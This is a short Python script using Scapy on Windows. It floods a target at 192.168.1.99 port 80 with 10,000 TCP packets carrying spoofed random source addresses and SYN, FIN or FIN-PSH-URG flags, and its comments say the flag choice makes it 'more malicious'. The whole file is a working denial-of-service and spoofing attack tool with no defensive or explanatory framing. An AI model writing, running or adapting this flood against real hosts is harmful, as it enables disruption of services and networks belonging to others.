import random
from scapy.all import IP, TCP, sendp
from scapy.arch.windows import get_windows_if_list

# Get the list of network interfaces
interfaces = get_windows_if_list()

# Use the first interface for sending packets
iface = interfaces[0]['name']

# Define the target IP address
target_ip = "192.168.1.99"

# Define the number of packets to send in the loop
num_packets = 10000  # Adjust as needed

# Valid TCP flags
valid_flags = ['F', 'R', 'S', 'P', 'A']

# Send the packets in a loop
for _ in range(num_packets):
    # Craft the packet with random source ports and IP addresses
    src_ip = "10.0.0." + str(random.randint(1, 254))  # Change source IP range to something different
    src_port = random.randint(1024, 65535)
    
    # Choose a random valid TCP flag, making it more malicious by preferring SYN or FIN flags
    flags = random.choice(['S', 'F', 'FPU'])  # Setting SYN, FIN, and URG flags
    
    # Craft the packet with the chosen flag and destination IP
    packet = IP(dst=target_ip, src=src_ip) / TCP(dport=80, sport=src_port, flags=flags)
    
    # Send the packet
    sendp(packet, verbose=False, iface=iface)
